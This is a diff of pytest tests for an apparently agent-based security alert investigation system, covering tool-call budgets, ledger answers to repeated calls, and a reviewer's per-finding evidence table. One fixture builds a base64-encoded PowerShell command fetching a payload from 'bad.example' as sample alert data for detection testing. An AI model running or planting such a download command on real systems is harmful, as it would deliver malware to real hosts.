@@ -6,6 +6,7 @@ import json
 import re
 from collections.abc import Sequence
 from datetime import UTC, datetime
+from itertools import count
 from typing import Any
 
 import pytest
@@ -15,7 +16,13 @@ from pydantic import ValidationError
 from app.agent.agents.common import INTEL_TOOLS, INVESTIGATOR_TOOLS, case_context
 from app.agent.agents.intel import extract_entities, make_intel
 from app.agent.agents.investigator import BUDGET_EXHAUSTED, build_findings, coverage_gap
-from app.agent.agents.reviewer import NOT_LISTED, NOT_VERIFIED, apply_verdict
+from app.agent.agents.reviewer import (
+    NOT_LISTED,
+    NOT_VERIFIED,
+    apply_verdict,
+    event_target,
+    evidence_by_finding,
+)
 from app.agent.agents.triage import make_triage
 from app.agent.case import (
     WITHHELD,
@@ -190,6 +197,19 @@ def tool_call(name: str, **args: Any) -> dict[str, Any]:
     return {"name": name, "args": args, "id": "x", "type": "tool_call"}
 
 
+def varied_searches() -> Any:
+    """A model that calls a tool every turn with new arguments, so no call is a repeat."""
+    turns = count()
+
+    def next_call(messages: Sequence[BaseMessage]) -> AIMessage:
+        around = f"2026-10-06T{next(turns) % 24:02d}:00:00Z"
+        return AIMessage(
+            "", tool_calls=[tool_call("search_process_events", host="FIN-WS-01", around=around)]
+        )
+
+    return next_call
+
+
 TREE_CALL = tool_call("get_process_tree", event_id=TRIGGER)
 SEARCH_CALL = tool_call("search_process_events", host="FIN-WS-01")
 DONE = AIMessage("The parent is AdminToolkit.exe and the child is msupdate.exe.")
@@ -324,8 +344,9 @@ async def test_triage_alone_scores_and_decides_without_data_tools() -> None:
 
 @pytest.mark.parametrize(("priority", "budget"), [("P1", 12), ("P2", 10), ("P3", 8), ("P4", 8)])
 async def test_priority_sets_the_investigator_budget(priority: str, budget: int) -> None:
-    always_search = AIMessage("", tool_calls=[SEARCH_CALL])
-    d, _, _ = deps({"triage": [TRIAGE | {"priority": priority}], "investigate": [always_search]})
+    d, _, _ = deps(
+        {"triage": [TRIAGE | {"priority": priority}], "investigate": [varied_searches()]}
+    )
 
     state = (await run(d)).state
 
@@ -384,8 +405,13 @@ async def test_intel_looks_up_the_whole_tree_with_no_llm_choice() -> None:
 
 
 async def test_intel_llm_gets_at_most_four_calls_and_only_its_tools() -> None:
-    lookup = tool_call("lookup_attack_technique", technique_id="T1059.001")
-    d, llm, _ = deps({"intel": [AIMessage("", tool_calls=[lookup])]})
+    techniques = (f"T{n}" for n in count(1059))
+
+    def lookups(messages: Sequence[BaseMessage]) -> AIMessage:
+        call = tool_call("lookup_attack_technique", technique_id=next(techniques))
+        return AIMessage("", tool_calls=[call])
+
+    d, llm, _ = deps({"intel": [lookups]})
 
     update = await intel_alone(d)
 
@@ -428,7 +454,7 @@ async def test_budget_exhaustion_ends_the_loop() -> None:
     d, llm, _ = deps(
         {
             "triage": [TRIAGE | {"priority": "P3"}],
-            "investigate": [AIMessage("", tool_calls=[TREE_CALL])],
+            "investigate": [varied_searches()],
             "review_verdict": [REOPEN],
         },
     )
@@ -552,18 +578,25 @@ async def test_invalid_tool_argument_comes_back_as_visible_error() -> None:
 
 
 async def test_several_tool_calls_in_one_turn_each_count() -> None:
-    two = AIMessage("", tool_calls=[TREE_CALL, SEARCH_CALL])
-    d, _, _ = deps({"triage": [TRIAGE | {"priority": "P3"}], "investigate": [two]})
+    other = tool_call("get_dns_queries", host="FIN-WS-01")
+    d, _, _ = deps({"investigate": [AIMessage("", tool_calls=[SEARCH_CALL, other]), DONE]})
 
     state = (await run(d)).state
 
     replies = [m for m in state.messages if isinstance(m, ToolMessage)]
-    assert state.tool_calls_used == 8 and len(replies) == 8
-    assert json.loads(replies[-1].content)["budget_left"] == 0
+    assert state.tool_calls_used == 2 and len(replies) == 2
+    assert [json.loads(r.content)["budget_left"] for r in replies] == [9, 8]
 
 
 async def test_calls_past_the_budget_in_one_turn_get_an_error() -> None:
-    three = AIMessage("", tool_calls=[TREE_CALL, SEARCH_CALL, TREE_CALL])
+    three = AIMessage(
+        "",
+        tool_calls=[
+            SEARCH_CALL,
+            tool_call("get_dns_queries", host="FIN-WS-01"),
+            tool_call("get_persistence_events", host="FIN-WS-01"),
+        ],
+    )
     d, _, _ = deps(
         {"investigate": [three]},
         investigator_budgets={"P1": 2, "P2": 2, "P3": 2, "P4": 2},
@@ -572,14 +605,114 @@ async def test_calls_past_the_budget_in_one_turn_get_an_error() -> None:
     state = (await run(d)).state
 
     replies = [m for m in state.messages if isinstance(m, ToolMessage)]
-    assert (
-        state.tool_calls_used == 2 and json.loads(replies[-1].content)["error"] == BUDGET_EXHAUSTED
+    assert state.tool_calls_used == 2
+    assert json.loads(replies[-1].content)["error"] == BUDGET_EXHAUSTED
+
+
+# --- exact repeats are answered from the ledger -----------------------------------------------
+
+
+async def test_repeat_of_another_agents_call_gets_the_full_result_free() -> None:
+    d, llm, calls = deps({"investigate": [AIMessage("", tool_calls=[TREE_CALL]), DONE]})
+
+    state = (await run(d)).state
+
+    assert [n for n, _ in calls].count("get_process_tree") == 1  # CyberIntel-Agent's, not again
+    (row,) = [r for r in state.tool_logs[INVESTIGATOR] if r.source == "llm"]
+    assert row.repeat_of == row.ref and not row.charged and state.tool_calls_used == 0
+    (reply,) = [m for m in llm.prompts["investigate"][1] if isinstance(m, ToolMessage)]
+    content = json.loads(reply.content)
+    assert content["repeat_of"] == row.ref and "CyberIntel-Agent" in content["repeat_note"]
+    assert content["untrusted_log_data"]["ancestors"][0]["name"] == "AdminToolkit.exe"
+
+
+async def test_repeat_of_own_call_gets_only_identifiers() -> None:
+    d, llm, calls = deps(
+        {
+            "investigate": [
+                AIMessage("", tool_calls=[SEARCH_CALL]),
+                AIMessage("", tool_calls=[SEARCH_CALL]),
+                DONE,
+            ]
+        },
+        {
+            "search_process_events": {
+                "untrusted_log_data": [{"event_id": CHILD, "pid": 77, "cmdline": "x" * 200}],
+                "total": 1,
+                "shown": 1,
+            }
+        },
     )
+
+    state = (await run(d)).state
+
+    assert [n for n, _ in calls].count("search_process_events") == 1
+    assert state.tool_calls_used == 1
+    replies = [m for m in llm.prompts["investigate"][2] if isinstance(m, ToolMessage)]
+    repeat = json.loads(replies[-1].content)
+    assert "same call as" in repeat["repeat_note"] and "x" * 200 not in replies[-1].content
+    assert repeat["untrusted_log_data"]["identifiers"]["event_ids"] == [CHILD]
+
+
+async def test_repeats_cost_budget_after_the_free_allowance() -> None:
+    d, llm, calls = deps(
+        {"investigate": [AIMessage("", tool_calls=[SEARCH_CALL])]},
+        investigator_budgets={"P1": 3, "P2": 3, "P3": 3, "P4": 3},
+    )
+
+    state = (await run(d)).state
+
+    # 1 real call, 3 free repeats, then 2 charged repeats use up the budget of 3.
+    assert [n for n, _ in calls].count("search_process_events") == 1
+    assert len(llm.prompts["investigate"]) == 6
+    assert state.tool_calls_used == 3 and state.stop_reason == "budget"
+
+
+async def test_a_failed_call_is_not_answered_from_the_ledger() -> None:
+    bad = AIMessage("", tool_calls=[tool_call("get_process_tree", event_id="evt_1")])
+    d, _, _ = deps({"investigate": [bad, bad, DONE]})
+
+    state = (await run(d)).state
+
+    assert state.tool_calls_used == 2
+    assert all(r.repeat_of is None for r in state.tool_logs[INVESTIGATOR])
+
+
+async def test_a_repeated_search_does_not_verify_an_absence_claim() -> None:
+    same = tool_call("get_persistence_events", host="FIN-WS-01", around="2026-10-06T10:00:00Z")
+
+    def absence(messages: Sequence[BaseMessage]) -> dict[str, Any]:
+        return {
+            "findings": [
+                {
+                    "claim": "No persistence observed",
+                    "kind": "absence",
+                    "citations": [ref_in(messages, "get_persistence_events")],
+                }
+            ]
+        }
+
+    def confirms(messages: Sequence[BaseMessage]) -> dict[str, Any]:
+        return VERDICT
+
+    d, _, _ = deps(
+        {
+            "investigate": [AIMessage("", tool_calls=[same]), DONE],
+            "summarize_findings": [absence],
+            "review": [AIMessage("", tool_calls=[same]), AIMessage("Checked.")],
+            "review_verdict": [confirms],
+        }
+    )
+
+    state = (await run(d)).state
+
+    assert statuses(state.findings) == {"F1": "disputed"}
+    assert state.findings[0].dispute_reason == NOT_VERIFIED
 
 
 async def test_rejected_tool_call_is_explained_to_the_model_once() -> None:
     rejected = InvalidToolCallError("parameters for tool get_host_info did not match schema")
-    d, llm, _ = deps({"investigate": [rejected, AIMessage("", tool_calls=[TREE_CALL]), DONE]})
+    d, llm, _ = deps({"investigate": [rejected, AIMessage("", tool_calls=[SEARCH_CALL]), DONE]})
 
     state = (await run(d)).state
 
@@ -661,6 +794,7 @@ async def test_unattempted_planned_checks_send_the_run_back_once() -> None:
             "plan": [PLAN_TWO_CHECKS],
             "investigate": [
                 AIMessage("", tool_calls=[TREE_CALL]),
+                AIMessage("", tool_calls=[SEARCH_CALL]),
                 DONE,
                 AIMessage("", tool_calls=[dns]),
                 AIMessage("", tool_calls=[HOST_CALL]),
@@ -672,13 +806,23 @@ async def test_unattempted_planned_checks_send_the_run_back_once() -> None:
     state = (await run(d)).state
 
     assert state.coverage_nudges == ["first_checks"]
-    nudge = str(llm.prompts["investigate"][2][-1].content)
+    nudge = str(llm.prompts["investigate"][3][-1].content)
     assert "get_dns_queries" in nudge and "get_process_tree" not in nudge
-    assert bound_tool_calls(state) == ["get_process_tree", "get_dns_queries", "get_logon_history"]
+    assert bound_tool_calls(state) == [
+        "get_process_tree",
+        "search_process_events",
+        "get_dns_queries",
+        "get_logon_history",
+    ]
 
 
 async def test_fewer_than_three_calls_send_the_run_back_once() -> None:
-    d, llm, _ = deps({"investigate": [AIMessage("", tool_calls=[TREE_CALL]), DONE]})
+    d, llm, _ = deps(
+        {
+            "plan": [PLAN | {"first_checks": []}],
+            "investigate": [AIMessage("", tool_calls=[SEARCH_CALL]), DONE],
+        }
+    )
 
     state = (await run(d)).state
 
@@ -968,16 +1112,55 @@ async def test_reviewer_can_confirm_an_absence_it_verified() -> None:
     assert statuses(state.findings) == {"F1": "confirmed", "F2": "confirmed"}
 
 
-async def test_verdict_sees_the_evidence_behind_the_findings() -> None:
-    d, llm, _ = deps(docs=[process_doc(TRIGGER, "powershell.exe -nop -w hidden")])
+async def test_verdict_sees_a_table_of_each_findings_evidence() -> None:
+    cmdline = f"powershell -enc {encode_powershell('iwr http://bad.example/x.bin')}"
+    d, llm, _ = deps(docs=[process_doc(TRIGGER, cmdline)])
 
     await run(d)
 
     prompt = json.loads(str(llm.prompts["review_verdict"][0][-1].content))
-    data = prompt["untrusted_log_data"]
-    assert data["trigger_events"][0]["event_id"] == TRIGGER
-    parent = next(r for r in data["intel_facts"]["process_chain"] if r["role"] == "parent")
-    assert parent["reputation"] == "known_good"
+    assert "investigator_evidence" not in prompt
+    (entry,) = prompt["untrusted_log_data"]["evidence_by_finding"]
+    (row,) = entry["cited_events"]
+    assert entry["finding"] == "F1" and row["event_id"] == TRIGGER
+    assert row["process"] == "powershell.exe" and row["parent"] == "WINWORD.EXE"
+    assert row["event_type"] == "process_start" and "bad.example" in row["target"]
+    assert row["signer"] == "Microsoft Windows"
+    assert "actor and the target" in str(llm.prompts["review_verdict"][0][0].content)
+
+
+def test_event_targets_are_what_the_event_acted_on() -> None:
+    base = {"event_id": "evt_000001", "ts": TS, "event_type": "x", "user": "a.b"}
+
+    assert (
+        event_target(base | {"file": {"path": "C:\\t\\a.exe"}, "process": {"name": "p"}})
+        == "C:\\t\\a.exe"
+    )
+    assert event_target(base | {"network": {"dst_ip": "203.0.113.9", "dst_port": 443}}) == (
+        "203.0.113.9:443"
+    )
+    assert event_target(base | {"dns": {"query": "bad.example"}}) == "bad.example"
+    logon = {"logon_type": "network", "src_ip": "10.0.0.1", "result": "success"}
+    assert "a.b" in (event_target(base | {"logon": logon}) or "")
+
+
+def test_cited_tool_results_appear_with_their_args_and_digest() -> None:
+    finding_ = finding("F1", "absence")
+    finding_ = finding_.model_copy(update={"citations": ["tool:get_dns_queries#4"]})
+    evidence = Evidence(
+        tool_refs={
+            "tool:get_dns_queries#4": ToolRef(
+                tool="get_dns_queries", ok=True, args={"host": "FIN-WS-01"}, digest="[]"
+            )
+        }
+    )
+
+    (entry,) = evidence_by_finding([finding_], {}, evidence)
+
+    assert entry["cited_events"] == []
+    assert entry["cited_tool_results"] == [
+        {"ref": "tool:get_dns_queries#4", "ok": True, "args": {"host": "FIN-WS-01"}, "result": "[]"}
+    ]
 
 
 async def test_reviewer_reopens_at_most_once() -> None:
@@ -999,7 +1182,7 @@ async def test_reviewer_reopens_at_most_once() -> None:
 
 async def test_budget_counts_across_a_reopen() -> None:
     d, _, _ = deps(
-        {"investigate": [AIMessage("", tool_calls=[SEARCH_CALL])], "review_verdict": [REOPEN]},
+        {"investigate": [varied_searches()], "review_verdict": [REOPEN]},
         investigator_budgets={"P1": 3, "P2": 3, "P3": 3, "P4": 3},
     )
 
@@ -1009,21 +1192,15 @@ async def test_budget_counts_across_a_reopen() -> None:
 
 
 async def test_reviewer_has_three_calls_per_run_across_passes() -> None:
+    second = {
+        "findings": [
+            {"claim": "powershell.exe second pass", "kind": "observation", "citations": [TRIGGER]}
+        ]
+    }
     d, _, _ = deps(
         {
-            "summarize_findings": [
-                FINDINGS,
-                {
-                    "findings": [
-                        {
-                            "claim": "powershell.exe second pass",
-                            "kind": "observation",
-                            "citations": [TRIGGER],
-                        }
-                    ]
-                },
-            ],
-            "review": [AIMessage("", tool_calls=[SEARCH_CALL])],
+            "summarize_findings": [FINDINGS, second],
+            "review": [varied_searches()],
             "review_verdict": [REOPEN],
         }
     )
